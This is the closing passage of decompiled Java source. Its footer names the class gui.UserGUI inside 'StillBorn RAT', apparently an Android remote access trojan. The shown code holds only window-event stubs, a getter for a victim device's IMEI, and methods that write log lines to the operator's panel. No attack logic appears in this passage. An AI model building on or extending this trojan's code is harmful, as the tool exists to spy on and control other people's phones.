/* 732:683 */     addWindowListener(this);
/* 733:    */   }
/* 734:    */   
/* 735:    */   public void windowOpened(WindowEvent e) {}
/* 736:    */   
/* 737:    */   public void windowClosed(WindowEvent e) {}
/* 738:    */   
/* 739:    */   public void windowIconified(WindowEvent e) {}
/* 740:    */   
/* 741:    */   public void windowDeiconified(WindowEvent e) {}
/* 742:    */   
/* 743:    */   public void windowActivated(WindowEvent e) {}
/* 744:    */   
/* 745:    */   public void windowDeactivated(WindowEvent e) {}
/* 746:    */   
/* 747:    */   public String getImei()
/* 748:    */   {
/* 749:711 */     return this.imei;
/* 750:    */   }
/* 751:    */   
/* 752:    */   public GUI getGUI()
/* 753:    */   {
/* 754:715 */     return this.gui;
/* 755:    */   }
/* 756:    */   
/* 757:    */   public void logTxt(long date, String txt)
/* 758:    */   {
/* 759:719 */     this.userLogPanel.append(Color.black, new Date(date) + " " + txt + "\n");
/* 760:    */   }
/* 761:    */   
/* 762:    */   public void errLogTxt(long date, String txt)
/* 763:    */   {
/* 764:723 */     this.userLogPanel.append(Color.red, new Date(date) + " " + txt + "\n");
/* 765:    */   }
/* 766:    */ }


/* Location:           C:\Users\SmileyFacedHacker\Downloads\StillBorn RAT (Android)\StillBorn RAT (Android)\StillBornRAT.jar
 * Qualified Name:     gui.UserGUI
 * JD-Core Version:    0.7.0.1
 */